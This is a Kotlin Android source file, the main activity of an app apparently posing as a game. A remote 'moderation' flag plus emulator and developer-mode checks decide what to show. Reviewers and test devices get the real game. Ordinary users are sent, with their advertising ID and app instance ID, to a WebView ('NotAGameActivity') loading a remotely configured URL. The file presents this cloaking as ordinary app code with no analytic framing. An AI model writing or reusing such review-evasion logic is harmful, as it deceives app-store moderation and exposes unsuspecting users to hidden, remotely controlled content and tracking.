package com.stral.dbldwn

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.ktx.Firebase
import com.stral.dbldwn.game.GameActivity
import org.json.JSONObject
import java.util.concurrent.Executors


class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val sharedPref = getSharedPreferences(
            getString(R.string.prefs_key), Context.MODE_PRIVATE
        )

        if (sharedPref.getString(SAVED_URL, "null") == "null" || sharedPref.getString(
                SAVED_MODERATION, "null"
            ) == "null"
        ) {
            FirebaseUtil.fetchConfig(this) {
                it?.let { config ->
                    val rawJsonConfig = config.getValue("Down").asString()
                    val json = JSONObject(rawJsonConfig)
                    val moderation = json.getBoolean("date")
                    val url = json.getString("what")
                    val editor = sharedPref.edit()
                    editor.putString(SAVED_MODERATION, moderation.toString())
                    editor.putString(SAVED_URL, url)
                    editor.apply()
                    runFlow(moderation.toString(), url)
                } ?: run {
                    Toast.makeText(this, "No internet", Toast.LENGTH_SHORT).show()
                }
            }
        } else {
            val url = sharedPref.getString(SAVED_URL, "null")
            val moderation = sharedPref.getString(SAVED_MODERATION, "null")
            runFlow(moderation, url)
        }
    }

    private fun runFlow(moderation: String?, url: String?) {
        var appInstanceId: String? = null
        if ((moderation == "true") || isEmulator || isDevMode(this)) {
            val intent = Intent(this, GameActivity::class.java)
            startActivity(intent)
            finish()
        } else {
            Firebase.analytics.appInstanceId.addOnCompleteListener {
                appInstanceId = it.result
                tryToGetAppUUIDandStartWebView(url, appInstanceId)
            }.addOnFailureListener {
                tryToGetAppUUIDandStartWebView(url, appInstanceId)
            }
        }
    }

    private fun tryToGetAppUUIDandStartWebView(
        url: String?, appInstanceId: String?
    ) {
        Executors.newSingleThreadExecutor().execute {
            var appUUID: String? = null
            try {
                val adInfo = AdvertisingIdClient.getAdvertisingIdInfo(this)
                appUUID = adInfo.id
                Handler(Looper.getMainLooper()).post {
                    startWebViewFlow(url, appInstanceId, appUUID)
                    finish()
                }

            } catch (e: Exception) {
                Log.e("TAG", e.message.orEmpty())
                Handler(Looper.getMainLooper()).post {
                    startWebViewFlow(url, appInstanceId, appUUID)
                    finish()
                }
            }
        }
    }

    private fun startWebViewFlow(url: String?, appInstanceId: String?, appUUID: String?) {
        val intent = Intent(this, NotAGameActivity::class.java)
        intent.putExtra("URL", url)
        intent.putExtra("APP_INSTANCE_ID", appInstanceId)
        intent.putExtra("ADVERTISING_ID", appUUID)
        startActivity(intent)
    }

    private val isEmulator: Boolean
        get() = (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")) || Build.FINGERPRINT.startsWith(
            "generic"
        ) || Build.FINGERPRINT.startsWith("unknown") || Build.HARDWARE.contains("goldfish") || Build.HARDWARE.contains(
            "ranchu"
        ) || Build.MODEL.contains("google_sdk") || Build.MODEL.contains("Emulator") || Build.MODEL.contains(
            "Android SDK built for x86"
        ) || Build.MANUFACTURER.contains("Genymotion") || Build.PRODUCT.contains("sdk_google") || Build.PRODUCT.contains(
            "google_sdk"
        ) || Build.PRODUCT.contains("sdk") || Build.PRODUCT.contains("sdk_x86") || Build.PRODUCT.contains(
            "sdk_gphone64_arm64"
        ) || Build.PRODUCT.contains("vbox86p") || Build.PRODUCT.contains("emulator") || Build.PRODUCT.contains(
            "simulator"
        );


    fun isDevMode(context: Context): Boolean {
        return Settings.Secure.getInt(
            context.contentResolver, Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0
        ) != 0
    }

    companion object {
        const val SAVED_URL = "SAVED_URL"
        const val SAVED_MODERATION = "SAVED_MODERATION"
    }
}